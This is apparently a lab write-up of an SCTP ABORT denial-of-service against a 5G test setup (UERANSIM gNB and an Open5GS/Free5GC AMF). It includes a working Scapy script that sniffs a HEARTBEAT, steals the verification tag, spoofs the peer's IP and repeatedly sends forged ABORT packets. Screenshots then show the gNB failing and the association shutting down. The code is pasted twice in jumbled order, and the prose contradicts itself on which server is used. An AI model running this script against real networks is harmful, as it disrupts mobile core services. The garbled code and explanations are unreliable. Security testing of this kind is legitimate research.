<div class="page">

# SCTP_Abort (DoS)

\

## Using SCTP_CHUNK_ABORT for a DoS over SCTP connections

(At the moment it is tested by sending the abort from the same device
that initiates the connection)

<div class="codebox">

The code used is the following:
    print("\nCaptured HEARTBEAT packet details:")
    print(f"Source IP: {src_ip}")
    print(f"Destination IP: {dst_ip}")
    print(f"Source Port: {src_port}")
    print(f"Destination Port: {dst_port}")
    print(f"Verification Tag: {vtag:#010x}")

    # Step 2: Sniffing stops automatically due to count=1

    # Step 3: Construct SCTP ABORT packet
    abort_pkt = (
        IP(src="10.10.10.7", dst="10.10.10.155") /
        SCTP(sport=dst_port, dport=src_port, tag=vtag) /
        SCTPChunkAbort(TCB=1)
        #SCTPChunkShutdown()
    )

print("\nABORT packet parameters:")
    print(f"Source IP: 10.10.10.7 (spoofed as Node C)")
    print(f"Destination IP: 10.10.10.155 (Node S)")
    print(f"Source Port: {dst_port}")
    print(f"Destination Port: {src_port}")
    print(f"Verification Tag: {vtag:#010x}")
    print("Chunk Type: ABORT")

    # Step 4: Send the ABORT packet to Node S
    from scapy.all import *
    import time

    # Function to check if a packet is an SCTP HEARTBEAT from Node S to Node C
    def is_heartbeat_packet(pkt):
        return ((SCTP in pkt) and
                (SCTPChunkHeartbeatReq in pkt) and
                (pkt[IP].src == "10.10.10.7") and
                (pkt[IP].dst == "10.10.10.155"))

    # Step 1: Monitor and capture a HEARTBEAT packet
    print("Monitoring network for SCTP HEARTBEAT packet from 10.10.10.7 to 10.10.1.155...>
    packets = sniff(iface="enp0s8", filter="sctp", prn=lambda x: x, stop_filter=is_heartbeat_packet, count=1)

if not packets:
        print("No HEARTBEAT packet captured. Exiting.")
        exit(1)

    # Extract the first captured packet
    heartbeat_pkt = packets[0]

    # Extract and print required fields
    src_ip = heartbeat_pkt[IP].src
    dst_ip = heartbeat_pkt[IP].dst
    src_port = heartbeat_pkt[SCTP].sport
    dst_port = heartbeat_pkt[SCTP].dport
    vtag = heartbeat_pkt[SCTP].tag

print("\nCaptured HEARTBEAT packet details:")
    print(f"Source IP: {src_ip}")
    print(f"Destination IP: {dst_ip}")
    print(f"Source Port: {src_port}")
    print(f"Destination Port: {dst_port}")
    print(f"Verification Tag: {vtag:#010x}")

    # Step 2: Sniffing stops automatically due to count=1

    # Step 3: Construct SCTP ABORT packet
    abort_pkt = (
        IP(src="10.10.10.7", dst="10.10.10.155") /
        SCTP(sport=dst_port, dport=src_port, tag=vtag) /
        SCTPChunkAbort(TCB=1)
        #SCTPChunkShutdown()
    )

print("\nABORT packet parameters:")
    print(f"Source IP: 10.10.10.7 (spoofed as Node C)")
    print(f"Destination IP: 10.10.10.155 (Node S)")
    print(f"Source Port: {dst_port}")
    print(f"Destination Port: {src_port}")
    print(f"Verification Tag: {vtag:#010x}")
    print("Chunk Type: ABORT")

    # Step 4: Send the ABORT packet to Node S
    print("\nSending ABORT packet to Node S (10.10.10.155)...")

for i in range(1, 11):
        send(abort_pkt, verbose=False)
        print(f"{i} - ABORT packet sent.\n")
        time.sleep(2)

</div>

Basically it performs the following actions:

1st Listen on the “enp0s8” interface, which is the one with IP 10.10.10.7 and
the UERANSIM GNB Server/Client

2º Captures the first SCTP_HEARTBEAT_REQ that UERANSIM (GNB) sends to the
server (Open5GS) at IP 10.10.10.155

3º Copy the association TAG (Verification Tag)

4º Generates a SCTP_CHUNK_ABORT... packet (Possible trigger: He
modified the TCB Byte, which by default is 0, to the value 1)

<span style="indent:4;">In the SCTP ABORT chunk, the "reserved" fields
7-bit and 1-bit "TCB" have specific functions:</span>

1. <span style="indent:4;">Reserved (7 bits): This field is reserved
    for future use and should be set to zero. It doesn't have a use
    defined in the current protocol specification, but is reserved
    for possible future extensions or modifications </span>
2. <span style="indent:4;">TCB (1 bit): The TCB (Transmission
    Control Block) is used to indicate whether the ABORT chunk contains
    additional information about the connection status that can be
    useful for diagnosis. If this bit is set to 1,
    means that the ABORT chunk includes additional information about the
    connection status</span>

5º A sequence of forwardings of this generated packet is sent

When you run it, the terminal displays the following:

![](../images/52-1.png)

As a consequence of the ABORT sequence, the GNB process goes into
ERROR y se cierra:

![](../images/52-2.png)

It is observed in the logs that the aborts end up generating an SCTP
association shutdown in the Free5GC (specifically in the AMF) caused
for an SCTP notification that is not handled by the code.

If we look at the screenshot (on the machine that contains the server
Free5GC:

![](../images/52-3.png)

The first Aborts do not cause a reaction on the server. However, in
the moment that the Client, oblivious to this entire process, generates a
HEARTBEAT, the server reacts with its own ABORT, triggered by
the SHUTDOWN of the association (with the AMF).

</div>